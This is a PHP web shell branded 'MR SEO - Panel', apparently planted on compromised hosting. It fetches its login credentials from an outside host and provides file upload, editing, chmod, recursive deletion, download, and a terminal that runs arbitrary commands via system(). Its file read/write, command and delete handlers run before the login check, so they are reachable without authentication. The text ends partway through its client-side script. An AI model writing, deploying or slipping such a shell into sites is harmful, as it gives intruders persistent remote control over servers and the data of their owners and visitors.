<?php

ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE);

session_start();

$current = realpath(getcwd());
$rootDir = preg_replace('#(.*?/public_html)(/.*)?$#', '$1', $current);

if ($rootDir === false) $rootDir = '/';
$authData = json_decode(file_get_contents('https://auth-api-dry6.onrender.com/'), true);
$valid_user = $authData['username'];
$valid_pass = $authData['password'];
function in_root($path) {
    global $rootDir;
    $real = realpath($path);
    if ($real === false) return false;
    // normalisasi trailing slash
    $root = rtrim($rootDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    $real = rtrim($real, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    return strpos($real, $root) === 0 || $real === $root;
}

function safe_realpath($path) {
    $r = realpath($path);
    if ($r !== false) return $r;
    // fallback: normalize
    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
    $ab = DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $parts);
    return $ab;
}

// -------------------- HANDLERS --------------------
if ($_GET['action'] === 'load' && isset($_GET['path'])) {
    echo file_get_contents($_GET['path']);
    exit;
}

if ($_GET['action'] === 'save' && isset($_POST['path']) && isset($_POST['content'])) {
    file_put_contents($_POST['path'], $_POST['content']);
    echo 'ok';
    exit;
}


// CHMOD modal (AJAX)
if (isset($_GET['chmod_modal']) && isset($_GET['ajax'])) {
    $file = $_GET['chmod_modal'];
    $real = safe_realpath($file);
    if (!in_root($real) || !file_exists($real)) {
        echo "<div style='color:#f44336;'>🗙 Path tidak valid.</div>";
        exit;
    }
    $currentPerm = substr(sprintf("%o", fileperms($real)), -4);
    echo "<h3 style='margin:0 0 10px 0;color:#fff;font-family:monospace;'>Ubah Permission: " . htmlspecialchars(basename($real)) . "</h3>
    <form method='post' onsubmit='submitChmod(event)' style='font-family:monospace;'>
        <input type='text' id='newPerm' value='$currentPerm' placeholder='0777' required style='padding:6px;background:#1b1b1b;border:1px solid #333;color:#fff;width:120px;border-radius:4px;'>
        <input type='hidden' id='targetFile' value='" . htmlspecialchars($real) . "'>
        <button type='submit' style='padding:6px 10px;margin-left:8px;border-radius:4px;border:none;background:#00bfff;color:#000;cursor:pointer;'>Ubah</button>
    </form>
    <div id='chmodStatus' style='margin-top:10px;color:#fff;'></div>";
    exit;
}

// CHMOD action
if (isset($_POST['do_chmod'])) {
    $file = $_POST['file'] ?? '';
    $permStr = $_POST['perm'] ?? '';
    $real = safe_realpath($file);
    if (!in_root($real) || !file_exists($real)) {
        echo "Gagal: path tidak valid.";
        exit;
    }
    // sanitize permission like '0777' or '644'
    $permStr = preg_replace('/[^0-7]/', '', $permStr);
    if ($permStr === '') {
        echo "Gagal: permission tidak valid.";
        exit;
    }
    $perm = intval($permStr, 8);
    if (@chmod($real, $perm)) {
        echo "OK";
    } else {
        echo "Gagal mengubah permission.";
    }
    exit;
}

// UPLOAD
if (isset($_FILES['upload_file'])) {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
    $currentDir = safe_realpath($dir);
    if (!in_root($currentDir) || !is_dir($currentDir)) $currentDir = $rootDir;
    
    $originalName = basename($_FILES['upload_file']['name']);
    $target = $currentDir . DIRECTORY_SEPARATOR . $originalName;
    $uploadSuccess = false;
    $finalName = $originalName;
    
    if (file_exists($target)) {
        $pathInfo = pathinfo($target);
        $basename = $pathInfo['filename'];
        $extension = isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
        $counter = 1;
        do {
            $newName = $basename . '_copy' . $counter . $extension;
            $newTarget = $currentDir . DIRECTORY_SEPARATOR . $newName;
            $counter++;
        } while (file_exists($newTarget));
        $target = $newTarget;
        $finalName = $newName;
    }
    
    if (is_uploaded_file($_FILES['upload_file']['tmp_name']) && move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        @chmod($target, 0666);
        $uploadSuccess = true;
    }
    
    $_SESSION['notification'] = [
        'type' => $uploadSuccess ? 'success' : 'error',
        'message' => $uploadSuccess
        ? 'File <b>' . htmlspecialchars($finalName) . '</b> berhasil diupload!'
        : 'Gagal upload file <b>' . htmlspecialchars($originalName) . '</b>'
    ];
    
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// CREATE FOLDER
if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
    $currentDir = safe_realpath($dir);
    if (!in_root($currentDir) || !is_dir($currentDir)) $currentDir = $rootDir;
    
    $folder = basename($_POST['folder_name']);
    $target = $currentDir . DIRECTORY_SEPARATOR . $folder;
    $created = false;
    
    if (!file_exists($target)) {
        if (@mkdir($target, 0777, true)) {
            @chmod($target, 0777);
            $created = true;
        }
    }
    
    $_SESSION['notification'] = [
        'type' => $created ? 'success' : 'error',
        'message' => $created
        ? 'Folder <b>' . htmlspecialchars($folder) . '</b> berhasil dibuat!'
        : 'Gagal membuat folder <b>' . htmlspecialchars($folder) . '</b> (sudah ada atau permission?)'
    ];
    
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// CREATE FILE
if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
    $currentDir = safe_realpath($dir);
    if (!in_root($currentDir) || !is_dir($currentDir)) $currentDir = $rootDir;
    
    $file = basename($_POST['file_name']);
    $target = $currentDir . DIRECTORY_SEPARATOR . $file;
    $created = false;
    $finalName = $file;
    
    if (file_exists($target)) {
        $pathInfo = pathinfo($target);
        $basename = $pathInfo['filename'];
        $extension = isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
        $counter = 1;
        do {
            $newName = $basename . '_copy' . $counter . $extension;
            $newTarget = $currentDir . DIRECTORY_SEPARATOR . $newName;
            $counter++;
        } while (file_exists($newTarget));
        $target = $newTarget;
        $finalName = $newName;
    }
    
    $handle = @fopen($target, 'w');
    if ($handle) {
        fclose($handle);
        @chmod($target, 0666);
        $created = true;
    }
    
    $_SESSION['notification'] = [
        'type' => $created ? 'success' : 'error',
        'message' => $created
        ? 'File <b>' . htmlspecialchars($finalName) . '</b> berhasil dibuat!'
        : 'Gagal membuat file <b>' . htmlspecialchars($file) . '</b>'
    ];
    
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// SAVE EDIT
if (isset($_POST['save_edit'])) {
    $file = $_POST['target_file'] ?? '';
    $data = $_POST['new_content'] ?? '';
    $real = safe_realpath($file);
    if (!in_root($real) || !is_file($real) || !is_writable(dirname($real))) {
        echo "ERROR: Tidak bisa menulis ke file: $file";
        exit;
    }
    $result = @file_put_contents($real, $data);
    if ($result === false) {
        echo "ERROR: Tidak bisa menulis ke file: $file";
    } else {
        @chmod($real, 0666);
        echo "OK";
    }
    exit;
}

// RENAME modal (AJAX)
if (isset($_GET['rename']) && isset($_GET['ajax'])) {
    $old = $_GET['rename'];
    $realOld = safe_realpath($old);
    if (!in_root($realOld) || !file_exists($realOld)) {
        echo "<div style='color:#f44336;'>🗙 Path tidak valid.</div>";
        exit;
    }
    echo "<h3 style='color:#fff;margin:0 0 10px 0;'>Rename: " . htmlspecialchars(basename($realOld)) . "</h3>
    <form method='post' onsubmit='submitRename(event)' style='font-family:monospace;'>
        <input type='text' id='newName' placeholder='Nama baru' value='" . htmlspecialchars(basename($realOld)) . "' required style='padding:6px;background:#1b1b1b;border:1px solid #333;color:#fff;width:260px;border-radius:4px;'>
        <input type='hidden' id='oldPath' value='" . htmlspecialchars($realOld) . "'>
        <button type='submit' style='padding:6px 10px;margin-left:8px;border-radius:4px;border:none;background:#00bfff;color:#000;cursor:pointer;'>Rename</button>
    </form>
    <div id='renameStatus' style='margin-top:10px;color:#fff;'></div>";
    exit;
}

// RENAME action
if (isset($_POST['do_rename'])) {
    $old = $_POST['old_path'] ?? '';
    $newName = basename($_POST['new_name'] ?? '');
    $realOld = safe_realpath($old);
    if (!in_root($realOld) || !file_exists($realOld) || $newName === '') {
        echo "Gagal: path tidak valid atau nama kosong.";
        exit;
    }
    $dir = dirname($realOld);
    $new = $dir . DIRECTORY_SEPARATOR . $newName;
    $finalName = $newName;
    $renamed = false;
    
    if (file_exists($new) && realpath($realOld) !== realpath($new)) {
        $pathInfo = pathinfo($new);
        $basename = $pathInfo['filename'];
        $extension = isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
        $counter = 1;
        do {
            $copyName = $basename . '_copy' . $counter . $extension;
            $copyPath = $dir . DIRECTORY_SEPARATOR . $copyName;
            $counter++;
        } while (file_exists($copyPath));
        $new = $copyPath;
        $finalName = $copyName;
    }
    
    if (@rename($realOld, $new)) {
        if (is_file($new)) {
            @chmod($new, 0666);
        } else {
            @chmod($new, 0777);
        }
        $renamed = true;
    }
    
    if ($renamed) {
        echo "OK";
    } else {
        echo "Gagal merubah nama file/folder.";
    }
    exit;
}

// DELETE handler (langsung hapus tanpa konfirmasi)
// Safety: hanya dapat menghapus path di dalam $rootDir
if (isset($_GET['delete'])) {
    $target = safe_realpath($_GET['delete']);
    if (!$target || !in_root($target) || !file_exists($target)) {
        // redirect back
        $redirectDir = isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
        $_SESSION['notification'] = ['type' => 'error', 'message' => 'Gagal: path tidak ditemukan atau tidak diizinkan.'];
        header("Location: ?dir=" . urlencode($redirectDir));
        exit;
    }
    
    // recursive delete with robust checks
    function deleteRecursiveSafe($t) {
        // ensure $t exists
        if (!file_exists($t)) return;
        // if symlink or file -> unlink
        if (is_link($t) || is_file($t)) {
            @chmod($t, 0777);
            @unlink($t);
            return;
        }
        if (is_dir($t)) {
            $items = @scandir($t);
            if ($items === false) {
                // try to force delete
                @chmod($t, 0777);
                @rmdir($t);
                return;
            }
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                deleteRecursiveSafe($t . DIRECTORY_SEPARATOR . $item);
            }
            // remove directory itself
            @chmod($t, 0777);
            @rmdir($t);
        }
    }
    
    deleteRecursiveSafe($target);
    
    $redirectDir = isset($_GET['dir']) ? $_GET['dir'] : dirname($target);
    // normalize redirect
    $redirectDir = safe_realpath($redirectDir);
    if (!in_root($redirectDir)) $redirectDir = $rootDir;
    
    $_SESSION['notification'] = ['type' => 'success', 'message' => 'Item dihapus.'];
    header("Location: ?dir=" . urlencode($redirectDir));
    exit;
}

// DOWNLOAD
if (isset($_GET['download'])) {
    $file = urldecode($_GET['download']);
    $real = safe_realpath($file);
    if (!in_root($real) || !is_file($real)) {
        http_response_code(404);
        echo "🗙 Gagal: file tidak ditemukan atau tidak valid.";
        exit;
    }
    while (ob_get_level()) ob_end_clean();
    header("Content-Description: File Transfer");
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"" . basename($real) . "\"");
    header("Content-Transfer-Encoding: binary");
    header("Expires: 0");
    header("Cache-Control: must-revalidate");
    header("Pragma: public");
    header("Content-Length: " . filesize($real));
    flush();
    readfile($real);
    exit;
}

// TERMINAL AJAX handler
if (isset($_GET['terminal']) && isset($_GET['ajax']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $cwd = $_POST['cwd'] ?? $rootDir;
    $cmd = $_POST['cmd'] ?? '';
    $cwdReal = safe_realpath($cwd);
    if (!in_root($cwdReal) || !is_dir($cwdReal)) $cwdReal = $rootDir;
    chdir($cwdReal);
    
    // handle simple cd
    if (preg_match('/^\s*cd\s+(.+)/', $cmd, $matches)) {
        $path = trim($matches[1]);
        // support relative paths
        if (!preg_match('/^\/|^[A-Za-z]:\\\\/', $path)) {
            $path = $cwdReal . DIRECTORY_SEPARATOR . $path;
        }
        $new = realpath($path);
        if ($new && is_dir($new) && in_root($new)) {
            echo "__CHDIR__:$new";
        } else {
            echo "🗙 Direktori tidak ditemukan atau tidak diizinkan: $path";
        }
    } else {
        // exec command
        ob_start();
        // avoid interactive commands: run with timeout maybe omitted; keep simple
        system($cmd . ' 2>&1');
        $out = ob_get_clean();
        echo $out;
    }
    exit;
}

// -------------------- AUTH: LOGIN / LOGOUT --------------------
$error = '';
if (isset($_POST['login'])) {
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';
    if ($user === $valid_user && md5($pass) === $valid_pass) {
        session_regenerate_id(true);
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Username atau Password salah!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// -------------------- VIEW: LOGIN --------------------
if (empty($_SESSION['logged_in'])):
    ?>
<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Server – Web Shell</title>
    <link rel="icon" type="image/x-icon" href="https://statics.hokibagus.club/favicon/favicon-shell.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
        integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
    :root {
        --bg: #0b0b0b;
        --card: #0f1113;
        --accent: #00d2ff;
        --muted: #9aa4ad;
        --danger: #ff6b6b;
    }

    * {
        box-sizing: border-box
    }

    body {
        margin: 0;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
        background-image: url(https://statics.hokibagus.club/etc/joker.jpg);
        background-size: cover;
        color: #e6eef3;
    }

    .card {
        width: 420px;
        padding: 32px;
        border-radius: 12px;
        background: #080b0ccf;
        box-shadow: 0 10px 30px rgba(2, 6, 23, 0.6);
        border: 1px solid rgba(255, 255, 255, 0.03);
    }

    .brand {
        font-weight: 700;
        font-size: 20px;
        color: var(--accent);
        margin-bottom: 8px
    }

    .hint {
        color: var(--muted);
        font-size: 13px;
        margin-bottom: 18px
    }

    .input {
        width: 100%;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #1a1a1a;
        background: #0b0f12;
        color: #dff7ff;
        margin-bottom: 12px
    }

    .btn {
        width: 100%;
        border-style: none;
        padding: 6px 10px;
        border-radius: 5px;
        border: none;
        background: var(--accent);
        color: #001;
        font-weight: 700;
        cursor: pointer
    }

    .small {
        font-size: 12px;
        color: var(--muted);
        text-align: center;
        margin-top: 12px
    }

    .footerlink {
        color: var(--accent);
        text-decoration: none
    }

    .error {
        background: rgba(255, 80, 80, 0.12);
        padding: 6px 8px;
        font-size: 13px;
        letter-spacing: 1px;
        border-radius: 4px;
        color: #f93636;
        margin-bottom: 12px;
    }
    </style>
</head>

<body>
    <div class="card">
        <div class="brand">MR SEO - Panel</div>
        <div class="hint">Silakan login untuk mengakses file manager.</div>
        <?php if ($error) echo "<div class='error'>".htmlspecialchars($error)."</div>"; ?>
        <form method="post" autocomplete="off">
            <input class="input" type="text" name="user" placeholder="Username" required>
            <input class="input" type="password" name="pass" placeholder="Password" required>
            <input class="btn" type="submit" name="login" value="Login">
        </form>
        <div class="small">By <a class="footerlink" href="" target="_blank">@MR SEO</a></div>
    </div>
</body>

</html>
<?php
exit;
endif;

// -------------------- MAIN PANEL --------------------
$currentDir = isset($_GET['dir']) ? safe_realpath($_GET['dir']) : $rootDir;
if (!in_root($currentDir) || !is_dir($currentDir)) $currentDir = $rootDir;
chdir($currentDir);

// notification
if (isset($_SESSION['notification'])) {
    $notif = $_SESSION['notification'];
    unset($_SESSION['notification']);
} else {
    $notif = null;
}

// gather items
$items = @scandir($currentDir);
if ($items === false) $items = [];

// compute parent
$parent = realpath(dirname($currentDir));
$currentReal = realpath($currentDir);

// -------------------- HTML OUTPUT --------------------
?>
<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Server – Web Shell</title>
    <link rel="icon" type="image/x-icon" href="https://statics.hokibagus.club/favicon/favicon-shell.png">
    <style>
    :root {
        --bg: #071019;
        --card: #0d1316;
        --accent: #00d2ff;
        --muted: #8ea1ab;
        --glass: rgba(255, 255, 255, 0.03)
    }

    * {
        box-sizing: border-box
    }

    body {
        margin: 0;
        font-size: 14px;
        font-family: monospace !important;
        background-image: url(https://statics.hokibagus.club/etc/joker.jpg);
        background-size: cover;
        color: #dbeef6
    }

    .header {
        background: #0000008c;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 18px 28px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.02)
    }

    .brandarea {
        display: flex;
        gap: 14px;
        align-items: center
    }

    .logo {
        width: 56px;
        height: 56px;
        border-radius: 10px;
        box-shadow: 0 6px 24px rgba(1, 10, 14, 0.6);
        overflow: hidden
    }

    .title {
        font-weight: 700;
        font-size: 20px;
        color: var(--accent)
    }

    .right {
        display: flex;
        gap: 10px;
        align-items: center
    }

    .btn {
        background: #0f1720;
        border-style: none;
        text-decoration: none;
        border: none;
        border: 1px solid rgba(255, 255, 255, 0.02);
        padding: 6px 10px;
        border-radius: 5px;
        color: #dff7ff;
        cursor: pointer
    }

    .btnAccent {
        background: var(--accent);
        color: #001;
        border: none
    }

    .controls {
        display: flex;
        gap: 10px;
        align-items: center
    }

    .container {
        display: flex;
        padding: 18px 28px;
        gap: 18px;
        align-items: flex-start
    }

    .sidebar {
        width: 260px;
        background: #0000008c;
        border-radius: 12px;
        padding: 14px;
        box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.02)
    }

    .main {
        flex: 1;
        background: #0000008c;
        border-radius: 12px;
        padding: 14px
    }

    .sectionTitle {
        font-weight: 700;
        color: #00ff22;
        margin-bottom: 10px
    }

    .serverInfo {
        font-size: 13px;
        color: var(--muted);
        line-height: 1.5;
        background: #4545458c;
        padding: 10px;
        border-radius: 8px
    }

    .fileList {
        margin-top: 12px
    }

    .fileLine {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 8px;
        border-radius: 8px;
        margin-bottom: 8px;
        background: transparent
    }

    .fileLine:hover {
        background: rgba(255, 255, 255, 0.02)
    }

    .fileMeta {
        display: flex;
        gap: 12px;
        align-items: center;
        flex: 1
    }

    .fileActions {
        display: flex;
        gap: 8px;
        align-items: center;
        min-width: 180px;
        justify-content: flex-end
    }

    .icon {
        font-size: 18px
    }

    .smallmuted {
        font-size: 13px;
        color: var(--muted)
    }

    .input {
        padding: 8px;
        border-radius: 8px;
        border: 1px solid rgba(255, 255, 255, 0.03);
        background: #0b1113;
        color: #dff7ff
    }

    .textarea {
        width: 100%;
        min-height: 120px;
        background: #061018;
        border-radius: 8px;
        padding: 10px;
        border: 1px solid rgba(255, 255, 255, 0.02);
        color: #dff7ff
    }

    .modal {
        display: none;
        position: fixed;
        inset: 0;
        background: rgba(2, 6, 12, 0.6);
        z-index: 9999;
        align-items: center;
        justify-content: center
    }

    .modalContent {
        width: 720px;
        background: #071016;
        border-radius: 10px;
        padding: 18px;
        border: 1px solid rgba(255, 255, 255, 0.03)
    }

    .closeX {
        float: right;
        color: #9fbccf;
        cursor: pointer
    }

    .footer {
        padding: 14px 28px;
        color: var(--muted);
        font-size: 13px;
        text-align: center;
        border-top: 1px solid rgba(255, 255, 255, 0.02);
        margin-top: 18px
    }

    .badge {
        padding: 4px 8px;
        border-radius: 6px;
        background: rgba(255, 255, 255, 0.02);
        color: var(--muted);
        font-size: 13px
    }

    .permission {
        cursor: pointer;
        padding: 6px 8px;
        border-radius: 6px;
        border: 1px solid rgba(255, 255, 255, 0.02)
    }

    hr.sep {
        border: 0;
        border-top: 1px solid rgba(255, 255, 255, 0.02);
        margin: 10px 0
    }

    .note {
        font-size: 13px;
        color: var(--muted);
        margin-top: 10px
    }
    </style>
</head>

<body>

    <div class="header">
        <div class="brandarea">
            <div class="logo"><img
                    src="https://res.cloudinary.com/dstvfk3po/image/upload/v1728405789/SINTASIN2_lncxzy.jpg"
                    style="width:100%;height:100%;object-fit:cover"></div>
            <div>
                <div class="title">MR SEO - File Manager</div>
                <div class="smallmuted">Dark admin panel • Desktop view</div>
            </div>
        </div>
        <div class="right">
            <div class="smallmuted">Logged in as <b>admin</b></div>
            <a href="?logout=1"><button class="btn" style="font-weight: bolder;" title="Logout">Logout</button></a>
        </div>
    </div>

    <?php if ($notif): ?>
    <div
        style="position:fixed;right:20px;top:20px;z-index:99999;padding:12px;border-radius:8px;background:<?= $notif['type'] === 'success' ? '#163e2c' : '#3a1e20' ?>;color:#dff7ff;border:1px solid rgba(255,255,255,0.03)">
        <?= ($notif['type']==='success' ? '✅' : '🗙') . ' ' . $notif['message'] ?>
    </div>
    <?php endif; ?>

    <div class="container">
        <div class="sidebar">
            <div class="sectionTitle">Server Info</div>
            <div class="serverInfo">
                <div><b>OS:</b> <?= htmlspecialchars(php_uname()) ?></div>
                <div><b>PHP:</b> <?= htmlspecialchars(phpversion()) ?></div>
                <div><b>Server:</b> <?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'CLI') ?></div>
                <hr class="sep">
                <div class="note">Tip: Klik permission untuk mengubahnya. Rename / Edit buka modal.</div>
            </div>

            <hr class="sep">

            <div style="margin-top:12px">
                <form method="post" enctype="multipart/form-data" id="uploadForm">
                    <label style="display:block;margin-bottom:6px;color:var(--muted)">Upload File</label>
                    <input class="input" type="file" name="upload_file" id="uploadFile"
                        onchange="document.getElementById('uploadForm').submit()" style="width:100%">
                    <input type="hidden" name="dummy" value="1">
                </form>
            </div>

            <div style="margin-top:12px">
                <form method="post">
                    <label style="display:block;margin-bottom:6px;color:var(--muted)">Buat Folder</label>
                    <input class="input" type="text" name="folder_name" placeholder="name folder"
                        style="width:100%;margin-bottom:8px">
                    <button class="btn" type="submit" name="create_folder">Create Folder</button>
                </form>
            </div>

            <div style="margin-top:12px">
                <form method="post">
                    <label style="display:block;margin-bottom:6px;color:var(--muted)">Buat File</label>
                    <input class="input" type="text" name="file_name" placeholder="file.txt"
                        style="width:100%;margin-bottom:8px">
                    <button class="btn" type="submit" name="create_file">Create File</button>
                </form>
            </div>
        </div>

        <div class="main">
            <div style="display:flex;justify-content:space-between;align-items:center">
                <div>
                    <div class="sectionTitle">File Manager - <?= htmlspecialchars($currentReal) ?></div>
                    <div class="smallmuted">Total: <?= count($items) ?> items</div>
                </div>
                <div class="controls">
                    <?php if ($parent !== $currentReal): ?>
                    <a href="?dir=<?= urlencode($parent) ?>" class="btn">Back</a>
                    <?php else: ?>
                    <span class="badge">⬅️ Sudah di root</span>
                    <?php endif; ?>
                    <a href="?dir=<?= urlencode($rootDir) ?>" class="btn">Root</a>
                </div>
            </div>

            <div class="fileList">
                <?php
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $fullPath = $currentReal . DIRECTORY_SEPARATOR . $item;
                $safe = htmlspecialchars($item);
                $isDir = is_dir($fullPath);
                $permStr = file_exists($fullPath) ? substr(sprintf("%o", fileperms($fullPath)), -4) : '----';
                echo "<div class='fileLine'>";
                echo "<div class='fileMeta'>";
                echo "<div class='icon'>".($isDir ? "📁" : "📄")."</div>";
                if ($isDir) {
                    echo "<div style='min-width:260px'><a href='?dir=".urlencode($fullPath)."' style='color:#dff7ff;text-decoration:none;font-weight:600;'>$safe</a></div>";
                } else {
                    // public link if within docroot
                    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $fullPath);
                    $relativePath = ltrim($relativePath, '/\\');
                    if ($relativePath && file_exists($fullPath)) {
                        echo "<div style='min-width:260px'><a href='/$relativePath' target='_blank' style='color:#dff7ff;text-decoration:none;font-weight:600;'>$safe</a></div>";
                    } else {
                        echo "<div style='min-width:260px;color:#cfeffd;'>$safe</div>";
                    }
                }
                echo "<div class='smallmuted'>".($isDir ? 'Folder' : number_format(filesize($fullPath)).' bytes')."</div>";
                echo "</div>";
                
                echo "<div class='fileActions'>";
                echo "<div class='permission' onclick=\"openModalWithURL('?chmod_modal=".urlencode($fullPath)."&ajax=1')\">$permStr</div>";
                if (!$isDir) {
                    echo "<button class='btn edit-btn' data-path='".htmlspecialchars($fullPath)."' title='Edit'>📝</button>";
                }
                
                echo "<button title='Rename' class='btn' onclick=\"openModalWithURL('?rename=".urlencode($fullPath)."&ajax=1')\">🔁</button>";
                echo "<a class='btn' href='?download=".urlencode($fullPath)."' title='Download'>⬇️</a>";
                echo "<a class='btn' title='Delete' href='?delete=".urlencode($fullPath)."&dir=".urlencode($currentReal)."'>🗙</a>";
                echo "</div>";
                echo "</div><hr class='sep'>";
            }
            ?>
            </div>
            <!-- Modal Edit -->
            <div id="editModal"
                style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); align-items:center; justify-content:center; z-index:9999;">
                <div
                    style="background: #000000a1; width: 80%; max-height: 90%; padding: 20px; border-radius: 10px; position: relative; overflow-y: auto; box-sizing: border-box;">
                    <h3 style="margin-top:0;">Edit File: <span id="editFileName"></span></h3>

                    <div style="display:flex; border:1px solid #ccc; border-radius:5px; overflow:hidden;">
                        <div id="lineNumbers"
                            style="background:#000000a1;color:#00ff22; padding:10px; text-align:right; user-select:none; font-family:monospace; white-space: pre; max-height:70vh;">
                        </div>
                        <textarea id="fileContent"
                            style="width:100%; height:70vh; font-family: monospace; padding:10px; resize: vertical; overflow:auto; border:none; outline:none; background:#111; color:#00ff22;">
            </textarea>
                    </div>

                    <div style="text-align: right; margin-top: 15px;">
                        <button id="saveEdit"
                            style="background:#00459d; color:white; padding:7px 12px; border:none; border-radius:5px; cursor:pointer;">Save</button>
                        <button id="closeEdit"
                            style="background:#f31717; color:white; padding:7px 12px; border:none; border-radius:5px; cursor:pointer;">Close</button>
                        <div id="saveStatus" style="margin-top:10px; display:none; color:green;">✅ Saved!</div>
                    </div>
                </div>
            </div>


            <script>
            // Buka modal edit dan load isi file
            document.querySelectorAll('.edit-btn').forEach(btn => {
                btn.addEventListener('click', async () => {
                    const path = btn.dataset.path;
                    const res = await fetch('?action=load&path=' + encodeURIComponent(path));
                    const data = await res.text();
                    document.getElementById('editFileName').innerText = path;
                    document.getElementById('fileContent').value = data;
                    updateLineNumbers();
                    document.getElementById('editModal').style.display = 'flex';
                });
            });

            // Tutup modal
            document.getElementById('closeEdit').addEventListener('click', () => {
                document.getElementById('editModal').style.display = 'none';
            });

            // Simpan file
            document.getElementById('saveEdit').addEventListener('click', async () => {
                const path = document.getElementById('editFileName').innerText;
                const content = document.getElementById('fileContent').value;
                const res = await fetch('?action=save', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(
                        content)
                });
                if (res.ok) {
                    const status = document.getElementById('saveStatus');
                    status.style.display = 'block';
                    setTimeout(() => status.style.display = 'none', 2000);
                }
            });

            // Nomor baris
            const textarea = document.getElementById('fileContent');
            const lineNumbers = document.getElementById('lineNumbers');

            function updateLineNumbers() {
                const lines = textarea.value.split('\n').length;
                lineNumbers.innerHTML = Array.from({
                    length: lines
                }, (_, i) => (i + 1)).join('<br>');
            }

            textarea.addEventListener('input', updateLineNumbers);
            textarea.addEventListener('scroll', () => {
                lineNumbers.scrollTop = textarea.scrollTop;
            });
            </script>

            <div style="margin-top:10px;color:var(--muted);font-size:13px">
                <b>Note:</b> Delete langsung akan dijalankan tanpa konfirmasi (diblokir jika berada di luar root panel).
            </div>
        </div>
    </div>

    <footer class="footer">
        By <b>MR SEO</b> ©2025 • Contact: <a style="color:var(--accent)" href="" target="_blank">@MR SEO</a>
    </footer>

    <!-- Modal -->
    <div class="modal" id="popupModal">
        <div class="modalContent" id="modalBody">
            <div style="display:flex;justify-content:space-between;align-items:center">
                <div style="font-weight:700;color:var(--accent)">Loading...</div>
                <div class="closeX" onclick="closeModal()">✖</div>
            </div>
            <div style="margin-top:14px;color:var(--muted)">Please wait...</div>
        </div>
    </div>

    <script>
    // modal helpers
    function closeModal() {
        const m = document.getElementById('popupModal');
        m.style.display = 'none';
        document.getElementById('modalBody').innerHTML =
            '<div style="display:flex;justify-content:space-between;align-items:center"><div style="font-weight:700;color:var(--accent)">Loading...</div><div class="closeX" onclick="closeModal()">✖</div></div><div style="margin-top:14px;color:#9aa4ad">Please wait...</div>';
    }

    function openModalWithURL(url) {
        const modal = document.getElementById('popupModal');
        modal.style.display = 'flex';
        fetch(url).then(r => r.text()).then(html => {
            document.getElementById('modalBody').innerHTML = html;
        }).catch(e => {
            document.getElementById('modalBody').innerHTML =
                '<div style="color:#ff6b6b">🗙 Error loading content.</div>';
        });
    }

    // submit rename (used inside modal)
    function submitRename(e) {
        e.preventDefault();
        const newName = document.getElementById('newName').value;
        const oldPath = document.getElementById('oldPath').value;
        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'do_rename=1&old_path=' + encodeURIComponent(oldPath) + '&new_name=' + encodeURIComponent(
                newName)
        }).then(r => r.text()).then(txt => {
            if (txt.trim() === 'OK') {
                location.reload();
            } else {
                document.getElementById('renameStatus').innerText = txt;
            }
        });
    }

    // submit chmod inside modal
    function submitChmod(e) {
        e.preventDefault();
        const perm = document.getElementById('newPerm').value;
        const file = document.getElementById('targetFile').value;
        const status = document.getElementById('chmodStatus');
        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'do_chmod=1&file=' + encodeURIComponent(file) + '&perm=' + encodeURIComponent(perm)
        }).then(r => r.text()).then(txt => {
            if (txt.trim() === 'OK') {
                closeModal();
                setTimeout(() => location.reload(), 500);
            } else {
                status.innerText = txt;
            }
        });
    }

    // submit edit (modal or full editor)
